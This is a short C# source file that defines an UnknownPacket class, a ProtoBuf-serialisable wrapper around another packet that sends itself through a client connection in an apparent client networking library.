using ProtoBuf;

namespace xClient.Core.Packets
{
    [ProtoContract]
    public class UnknownPacket : IPacket
    {
        public UnknownPacket()
        {
        }

        public UnknownPacket(IPacket packet)
        {
            Packet = packet;
        }

        [ProtoMember(1)]
        public IPacket Packet { get; set; }

        public void Execute(Client client)
        {
            client.Send<UnknownPacket>(this);
        }
    }
}